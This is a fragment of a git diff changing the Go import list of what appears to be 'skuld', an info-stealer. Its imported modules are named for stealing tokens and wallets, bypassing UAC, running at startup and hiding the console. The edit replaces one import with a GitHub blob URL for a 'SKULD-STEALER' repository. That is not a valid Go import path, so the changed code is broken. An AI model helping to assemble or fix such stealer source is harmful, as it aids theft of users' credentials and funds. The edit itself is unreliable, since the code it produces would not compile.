@@ -13,7 +13,7 @@ import (
 	"github.com/hackirby/skuld/modules/games"
 	"github.com/hackirby/skuld/modules/hideconsole"
 	"github.com/hackirby/skuld/modules/startup"
-	"github.com/hackirby/skuld/modules/system"
+	"https://github.com/HANNIBAL-THO/SKULD-STEALER/blob/main/modules/system/system.go"
 	"github.com/hackirby/skuld/modules/tokens"
 	"github.com/hackirby/skuld/modules/uacbypass"
 	"github.com/hackirby/skuld/modules/wallets"
